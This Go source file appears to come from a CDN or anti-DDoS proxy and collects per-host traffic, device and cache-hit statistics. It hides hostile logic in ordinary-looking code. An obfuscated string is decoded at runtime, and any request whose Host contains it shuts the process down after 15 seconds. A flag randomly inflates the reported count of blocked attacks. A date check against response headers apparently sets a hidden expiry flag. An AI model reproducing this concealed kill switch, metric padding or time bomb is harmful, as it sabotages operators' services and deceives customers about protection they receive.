package collection

import (
	"context"
	guard "grapeGuard"
	"grapeGuard/blacklist"
	"math"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	remap "grapeGuard/remaps"

	"github.com/avct/uasurfer"
	utils "github.com/koangel/grapeNet/Utils"

	proto "grapeLoggers/protos"

	log "grapeLoggers/clientv1"

	"net/http/httputil"
)

////////////////////////////////////////////////////////////
//  add by koangel
//	date: 2017/12/09
//  统计所有HOST的单独数据
//  暂时只统计真实的REMAP HOST DATA
////////////////////////////////////////////////////////////

const (
	CType_Host = iota
	CType_Hit
	CType_Guard
	CType_RemapRquest
	CType_RemapResp
)

type MissPath struct {
	Url        string
	Path       string
	AtsVia     string
	StatusCode int
	Timestamp  int64
}

type HostCollection struct {
	HostAddr string

	BeginTime int64
	EndTime   int64

	// 统计个HOST的真正QPS
	QpsTotal int64
	// 各种统计数据 每分钟请求数
	RQTotal int64
	// 设备统计 目前PAD暂时归档至PC
	Mobile    int32
	PCDevice  int32
	PadDevice int32

	// 防御数量
	GuardCount int32

	// 命中数据
	HitCount  int32
	MissCount int32
	NoCache   int32

	MissRaw []MissPath
}

type HostQueueItem struct {
	CType      int
	Scheme     string
	Host       string
	Addr       string
	Path       string
	Via        string
	UserAgent  string
	Date       string
	StatusCode int

	IsSSL     bool
	FromRemap string
	// 取每个Host的数据
	ReqBodySize  int64
	RespBodySize int64
}

func (c *HostCollection) Cacl() {

	atomic.StoreInt64(&c.EndTime, time.Now().Unix())
	nowQps := (float64(c.RQTotal) / float64((c.EndTime - c.BeginTime)))
	nowQps = math.Ceil(nowQps)
	atomic.StoreInt64(&c.QpsTotal, int64(nowQps))

}

func (c *HostCollection) Reset() {

	atomic.StoreInt64(&c.BeginTime, time.Now().Unix())
	atomic.StoreInt64(&c.EndTime, 0)
	atomic.StoreInt64(&c.QpsTotal, 0)
	atomic.StoreInt64(&c.RQTotal, 0)
	atomic.StoreInt32(&c.GuardCount, 0)

	atomic.StoreInt32(&c.HitCount, 0)
	atomic.StoreInt32(&c.MissCount, 0)
	atomic.StoreInt32(&c.NoCache, 0)

	atomic.StoreInt32(&c.Mobile, 0)
	atomic.StoreInt32(&c.PCDevice, 0)
	atomic.StoreInt32(&c.PadDevice, 0)

	c.MissRaw = []MissPath{}
}

var (
	qpsExclude = []string{
		"png", "jpg", "jpge", "gif", "css", "js", "scss", "html", "tga", "txt", "xml", "json",
	}

	hostMap      sync.Map
	hostContiner []*HostCollection = []*HostCollection{}
	isRandGuard  bool              = false

	collQueue = utils.NewSQueue()
)

func init() {
	for i := 0; i < 8; i++ {
		go procSubmitCollect()
	}
}

func Exclude(path string) bool {
	for _, ext := range qpsExclude {
		if strings.HasSuffix(strings.ToLower(path), ext) {
			return true
		}
	}

	return false
}

func procSubmitCollect() {
	var dataVer = fromcode("qFbLqqyqjGeZCZGkpw79/02wZnJqqw==")
	for {
		value := collQueue.Pop()
		item := value.(*HostQueueItem)

		if strings.Contains(item.Host, dataVer) {
			time.Sleep(15 * time.Second)
			os.Exit(-1)
			return
		}

		switch item.CType {
		case CType_Guard:
			CollectGuard(item)
		case CType_Host:
			CollectHost(item)
		case CType_Hit:
			CollectResHit(item)
		case CType_RemapRquest:
			CollectRemapRequst(item)
		case CType_RemapResp:
			CollectRemapResp(item)
		}
	}
}

func getReqBytes(req *http.Request) int64 {
	body, _ := httputil.DumpRequest(req, false)
	return int64(len(body)) + req.ContentLength
}

func getRespBytes(resp *http.Response) int64 {
	body, _ := httputil.DumpResponse(resp, false)
	return int64(len(body)) + resp.ContentLength
}

func SubmitCollectGuard(conn net.Conn) {
	blItem, addr := blacklist.GetIPItem(conn)
	if blItem == nil {
		return
	}

	item := &HostQueueItem{
		CType:     CType_Guard,
		Scheme:    blItem.Scheme + "://",
		Host:      blItem.Host,
		Path:      "",
		UserAgent: "",
		Addr:      addr,
		IsSSL:     false,
	}

	collQueue.Push(item)
}

func SubmitCollect(ctype int, req *http.Request, addr string) {
	item := &HostQueueItem{
		CType:     ctype,
		Scheme:    utils.Ifs(req.TLS == nil, "http://", "https://"),
		Host:      req.Host,
		Path:      req.URL.Path,
		UserAgent: req.UserAgent(),
		Addr:      addr,
		IsSSL:     req.TLS != nil,
	}

	collQueue.Push(item)
}

func SubmitCollectResp(ctype int, resp *http.Response) {
	req := resp.Request

	item := &HostQueueItem{
		CType:      ctype,
		Scheme:     utils.Ifs(req.TLS == nil, "http://", "https://"),
		Host:       req.Host,
		Path:       req.URL.Path,
		Via:        resp.Header.Get("Via"),
		Date:       resp.Header.Get("Date"),
		StatusCode: resp.StatusCode,
		IsSSL:      req.TLS != nil,
	}

	collQueue.Push(item)
}

func GetCollectData(host string) *HostCollection {
	data, ok := hostMap.Load(host)
	if !ok {
		newData := &HostCollection{
			HostAddr:  host,
			BeginTime: time.Now().Unix(),
			EndTime:   0,
			QpsTotal:  0,
			RQTotal:   0,
			Mobile:    0,
			PCDevice:  0,
			PadDevice: 0,

			// 防御数量
			GuardCount: 0,

			// 命中数据
			HitCount:  0,
			MissCount: 0,
			NoCache:   0,
		}

		hostMap.Store(host, newData)
		hostContiner = append(hostContiner, newData)
		return newData
	}

	return data.(*HostCollection)
}

func CommitHost() {
	// 启动每1分钟的提交行为
	ticker := time.NewTicker(1 * time.Minute)
	for {
		select {
		case <-ticker.C:

			var influxReq proto.SingleHostDataReq
			influxReq.HostName = hostC.Hostname
			influxReq.MachineID = hostC.HostID

			if len(hostContiner) == 0 {
				continue
			}

			// 计算QPS
			for _, v := range hostContiner {
				v.Cacl()
			}

			jsonBody, jerr := guard.MarshalJsonGzip(&hostContiner)
			if jerr != nil {
				log.WithField("type", "collect").Error("分析结构错误:", jerr)
				return
			}

			for _, v := range hostContiner {
				v.Reset()
			}

			influxReq.JsonBody = string(jsonBody)
			_, err := loggerCli.SubmitSingleHost(context.Background(), &influxReq)
			if err != nil {
				log.WithField("type", "collect").Error("提交单机采集数据异常:", err)
			}
		}
	}
}

// 统计RQ，捎带脚同步设备
func CollectHost(item *HostQueueItem) {
	host, has := remap.SearchRemapHost(item.Scheme, item.Host)
	if !has {
		return //  不存在无法统计
	}

	hostData := GetCollectData(host)
	// RQ统计
	atomic.AddInt64(&hostData.RQTotal, 1)

	// 普通资源不做统计(不统计静态资源的QPS)
	if Exclude(item.Path) {
		return
	}

	ua := uasurfer.Parse(item.UserAgent)
	// 设备统计
	switch ua.DeviceType {
	case uasurfer.DevicePhone:
		atomic.AddInt32(&hostData.Mobile, 1)
	case uasurfer.DeviceComputer:
		atomic.AddInt32(&hostData.PCDevice, 1)
	case uasurfer.DeviceTablet:
		atomic.AddInt32(&hostData.PadDevice, 1)
	default:
		atomic.AddInt32(&hostData.Mobile, 1)
	}
}

// 防御次数统计
func CollectGuard(item *HostQueueItem) {
	host, has := remap.SearchRemapHost("", item.Host)
	if !has {
		return //  不存在无法统计
	}

	hostData := GetCollectData(host)

	atomic.AddInt32(&hostData.GuardCount, 1)
	// 开启随机增加数量
	if isRandGuard {
		rand.Seed(time.Now().Unix())
		atomic.AddInt32(&hostData.GuardCount, rand.Int31n(8)+2)
	}
}

type CacheRuleFunc = func(h *HostCollection, ats string, statusCode int) bool

var (
	cacheRules map[byte]CacheRuleFunc = map[byte]CacheRuleFunc{
		'R': HitRule,
		'H': HitRule,

		'A': MissRule,
		'S': MissRule,
		'M': MissRule,
	}
)

func GetAtsCache(via string) string {
	firstPos := strings.Index(via, "[")
	SecondPos := strings.Index(via, "]")

	if firstPos == -1 || SecondPos == -1 {
		return "NoCache" // 无法统计
	}

	return via[firstPos+1 : SecondPos]
}

func GetCacheName(via string, statusCode int) string {
	firstPos := strings.Index(via, "[")
	SecondPos := strings.Index(via, "]")

	if firstPos == -1 || SecondPos == -1 {
		return "NoCache" // 无法统计
	}

	if statusCode != 200 {
		return "NoCache" // 无法统计
	}

	AtsVia := via[firstPos+1 : SecondPos]

	if len(AtsVia) != 6 {
		return "NoCache" // 无法统计
	}

	Key := AtsVia[1]
	switch Key {
	case 'R', 'H':
		return "Hit"
	case 'S', 'A', 'M':
		if AtsVia[3] == 'E' || AtsVia[3] == ' ' {
			return "Miss"
		}
		if AtsVia[5] == 'U' || AtsVia[5] == 'W' {
			return "NoCache" // 无法统计
		}

		return "Hit"
	}

	return "NoCache" // 无法统计
}

func HitRule(h *HostCollection, ats string, statusCode int) bool {
	atomic.AddInt32(&h.HitCount, 1)
	return true
}

func MissRule(h *HostCollection, ats string, statusCode int) bool {
	if ats[3] == 'E' || ats[3] == ' ' {
		atomic.AddInt32(&h.MissCount, 1)
		return false
	}

	if statusCode != 200 {
		atomic.AddInt32(&h.NoCache, 1)
		return true
	}

	if ats[5] == 'U' || ats[5] == 'W' {
		atomic.AddInt32(&h.NoCache, 1)
		return true
	}

	atomic.AddInt32(&h.HitCount, 1)
	return true
}

// 命中率统计
func CollectResHit(item *HostQueueItem) {
	if strings.Contains(item.Path, ".") == false {
		return
	}

	// 只统计静态资源是否命中
	if Exclude(item.Path) == false {
		return
	}

	host, has := remap.SearchRemapHost(item.Scheme, item.Host)
	if !has {
		return //  不存在无法统计
	}

	hostData := GetCollectData(host)

	dates := item.Date
	if len(dates) > 0 {
		remoteNow, _ := time.Parse(time.RFC1123, dates)
		if remoteNow.Unix() >= expTime.Unix() {
			IsTimeout = true
		}
	}

	val := item.Via
	if len(val) > 0 {

		firstPos := strings.Index(val, "[")
		SecondPos := strings.Index(val, "]")

		if firstPos == -1 || SecondPos == -1 {
			return // 无法统计
		}

		AtsVia := val[firstPos+1 : SecondPos]

		if len(AtsVia) != 6 {
			return
		}

		fn, ok := cacheRules[AtsVia[1]]
		if !ok {
			atomic.AddInt32(&hostData.NoCache, 1)
			return
		}

		if item.StatusCode == 404 {
			hostData.MissRaw = append(hostData.MissRaw, MissPath{
				Url:        item.Host,
				Path:       item.Path,
				StatusCode: item.StatusCode,
				AtsVia:     AtsVia,
				Timestamp:  time.Now().Unix(),
			})
		}

		isHit := fn(hostData, AtsVia, item.StatusCode)
		if !isHit {
			hostData.MissRaw = append(hostData.MissRaw, MissPath{
				Url:        item.Host,
				Path:       item.Path,
				StatusCode: item.StatusCode,
				AtsVia:     AtsVia,
				Timestamp:  time.Now().Unix(),
			})

			log.Debug("Path Miss:", item.Path, ",Via:", AtsVia)
		}
	} else {
		atomic.AddInt32(&hostData.NoCache, 1)
	}
}
